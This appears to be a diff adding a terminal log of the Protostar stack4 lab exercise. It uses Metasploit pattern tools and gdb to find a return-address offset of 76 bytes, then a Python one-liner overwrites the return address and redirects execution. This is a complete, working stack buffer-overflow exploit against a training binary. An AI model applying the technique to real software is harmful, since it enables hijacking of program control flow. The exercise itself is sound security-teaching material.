@@ -1,0 +1,18 @@
+oot@bt:/opt/metasploit/msf3/tools# ruby pattern_create.rb 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+gdb ./stack4
+(gdb) run
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+(gdb) 
+
+root@bt:/opt/metasploit/msf3/tools# ruby pattern_offset.rb 63413563 100
+76
+
+user@protostar:/opt/protostar/bin$ python -c 'print "A"*76 + "\xf4\x83\x04\x08"' | ./stack4 
+code flow successfully changed
+Segmentation fault
+
